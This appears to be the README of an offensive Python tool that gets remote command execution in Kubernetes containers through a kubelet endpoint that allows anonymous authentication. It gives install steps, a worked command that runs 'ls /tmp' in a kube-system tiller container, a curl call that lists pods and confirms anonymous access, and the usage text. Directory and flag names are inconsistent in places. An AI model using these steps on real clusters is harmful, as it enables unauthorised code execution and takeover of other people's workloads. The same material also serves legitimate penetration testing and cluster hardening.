# Kubelet Anonymous RCE

>Executes commands in a container on a kubelet endpoint that allows anonymous authentication (default)

## Why?

By default `kubelet` allows anonymous authentication:

```
--anonymous-auth
    Enables anonymous requests to the Kubelet server. Requests that are not
    rejected by another authentication method are treated as anonymous
    requests. Anonymous requests have a username of system:anonymous, and a
    group name of system:unauthenticated. (default true)
```

The `kubelet` API is not documented but the [code](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) is straightforward.

There is a `/exec` endpoint which allows running a command in a target container and returns a link to fetch the output. That link is a stream that should be read with a WebSocket.

This script handles it all easily.

## Install

```
$ git clone https://github.com/serain/kubelet-anon-rce.git
$ cd kubelet-anon-exec
$ pip3 install -r requirements.txt
```

## Example

This command runs `ls /tmp` in the `tiller` container and returns the output:

```
$ python3 kubelet-anon-rce.py           \
          --node 10.1.2.3               \
          --namespace kube-system       \
          --pod tiller-797d1b1234-gb6qt \
          --container tiller            \
          --exec "ls /tmp"
```

## How do I find containers?

You can get a list of pods/containers running on the node from the `/pods` endpoint:

```
$ curl https://10.1.2.3:10250/pods
```

This is also useful to confirm anonymous authentication.

## Help

```
$ python kubelet-anon-exec.py --help
usage: kubelet-anon-exec.py [-h] [--port PORT] -t TARGET -n NAMESPACE -p POD
                            -c CONTAINER -x EXEC

Run commands against a Kubelet endpoint.

optional arguments:
  -h, --help            show this help message and exit
  --port PORT           endpoint port, default: 10250
  -t TARGET, --target TARGET
                        Kubernetes node IP address
  -n NAMESPACE, --namespace NAMESPACE
                        namespace, ie: 'default'
  -p POD, --pod POD     pod name, ie: 'dh-nginx-8484b69674-z9tzl'
  -c CONTAINER, --container CONTAINER
                        container name, ie:'nginx'
  -x EXEC, --exec EXEC  command to execute, ie: 'ls /tmp'
```
